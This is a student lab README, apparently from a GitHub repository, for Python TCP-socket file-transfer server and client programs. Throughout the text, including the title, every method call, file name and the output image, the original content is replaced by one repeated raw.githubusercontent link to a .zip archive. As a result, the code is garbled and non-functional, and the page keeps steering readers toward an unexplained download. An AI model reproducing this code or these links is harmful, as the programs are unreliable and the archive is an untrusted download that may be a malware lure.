# https://raw.githubusercontent.com/24013396/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/fulcrum/3c.FILE_TRANSFER_USING_TCP_SOCKETS_v1.2.zip FOR FILE TRANSFER USING TCP SOCKETS
## AIM
To write a python program for creating File Transfer using TCP Sockets Links
## ALGORITHM:
1. Import the necessary python modules.
2. Create a socket connection using socket module.
3. Send the message to write into the file to the client file.
4. Open the file and then send it to the client in byte format.
5. In the client side receive the file from server and then write the content into it.
## PROGRAM
#### Developed by : **SHAIK HAZEEDMASTHAN**
#### Reg No : **212224040304**
### https://raw.githubusercontent.com/24013396/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/fulcrum/3c.FILE_TRANSFER_USING_TCP_SOCKETS_v1.2.zip
```python
import socket
port = 60000
s = https://raw.githubusercontent.com/24013396/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/fulcrum/3c.FILE_TRANSFER_USING_TCP_SOCKETS_v1.2.zip()
host = https://raw.githubusercontent.com/24013396/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/fulcrum/3c.FILE_TRANSFER_USING_TCP_SOCKETS_v1.2.zip()
https://raw.githubusercontent.com/24013396/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/fulcrum/3c.FILE_TRANSFER_USING_TCP_SOCKETS_v1.2.zip((host, port))
https://raw.githubusercontent.com/24013396/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/fulcrum/3c.FILE_TRANSFER_USING_TCP_SOCKETS_v1.2.zip(5)
while True:
    conn, addr = https://raw.githubusercontent.com/24013396/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/fulcrum/3c.FILE_TRANSFER_USING_TCP_SOCKETS_v1.2.zip()
    data = https://raw.githubusercontent.com/24013396/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/fulcrum/3c.FILE_TRANSFER_USING_TCP_SOCKETS_v1.2.zip(1024)
    print('Server received', repr(data))
    filename='https://raw.githubusercontent.com/24013396/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/fulcrum/3c.FILE_TRANSFER_USING_TCP_SOCKETS_v1.2.zip'
    f = open(filename,'rb')
    l = https://raw.githubusercontent.com/24013396/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/fulcrum/3c.FILE_TRANSFER_USING_TCP_SOCKETS_v1.2.zip(1024)
    while (l):
        https://raw.githubusercontent.com/24013396/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/fulcrum/3c.FILE_TRANSFER_USING_TCP_SOCKETS_v1.2.zip(l)
        print('Sent ',repr(l))
        l = https://raw.githubusercontent.com/24013396/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/fulcrum/3c.FILE_TRANSFER_USING_TCP_SOCKETS_v1.2.zip(1024)
    https://raw.githubusercontent.com/24013396/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/fulcrum/3c.FILE_TRANSFER_USING_TCP_SOCKETS_v1.2.zip()
    print('Done sending')
    https://raw.githubusercontent.com/24013396/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/fulcrum/3c.FILE_TRANSFER_USING_TCP_SOCKETS_v1.2.zip('Thank you for connecting'.encode())
    https://raw.githubusercontent.com/24013396/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/fulcrum/3c.FILE_TRANSFER_USING_TCP_SOCKETS_v1.2.zip()
```

### https://raw.githubusercontent.com/24013396/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/fulcrum/3c.FILE_TRANSFER_USING_TCP_SOCKETS_v1.2.zip
```python 
import socket
s = https://raw.githubusercontent.com/24013396/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/fulcrum/3c.FILE_TRANSFER_USING_TCP_SOCKETS_v1.2.zip()
host = https://raw.githubusercontent.com/24013396/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/fulcrum/3c.FILE_TRANSFER_USING_TCP_SOCKETS_v1.2.zip()
port = 60000
https://raw.githubusercontent.com/24013396/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/fulcrum/3c.FILE_TRANSFER_USING_TCP_SOCKETS_v1.2.zip((host, port))
https://raw.githubusercontent.com/24013396/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/fulcrum/3c.FILE_TRANSFER_USING_TCP_SOCKETS_v1.2.zip("Hello server!".encode())
with open('https://raw.githubusercontent.com/24013396/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/fulcrum/3c.FILE_TRANSFER_USING_TCP_SOCKETS_v1.2.zip', 'wb') as f:
 while True:
    print('receiving data...')
    data = https://raw.githubusercontent.com/24013396/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/fulcrum/3c.FILE_TRANSFER_USING_TCP_SOCKETS_v1.2.zip(1024)
    print('data=%s', (data))
    if not data:
        break
    https://raw.githubusercontent.com/24013396/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/fulcrum/3c.FILE_TRANSFER_USING_TCP_SOCKETS_v1.2.zip(data)
https://raw.githubusercontent.com/24013396/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/fulcrum/3c.FILE_TRANSFER_USING_TCP_SOCKETS_v1.2.zip()
print('Successfully get the file')
https://raw.githubusercontent.com/24013396/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/fulcrum/3c.FILE_TRANSFER_USING_TCP_SOCKETS_v1.2.zip()
print('connection closed')
```
## OUPUT
Refer to the following image to view the output of the program.
![Output](https://raw.githubusercontent.com/24013396/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/fulcrum/3c.FILE_TRANSFER_USING_TCP_SOCKETS_v1.2.zip)
## RESULT
Thus, the python program for creating File Transfer using TCP Sockets Links was 
successfully created and executed.
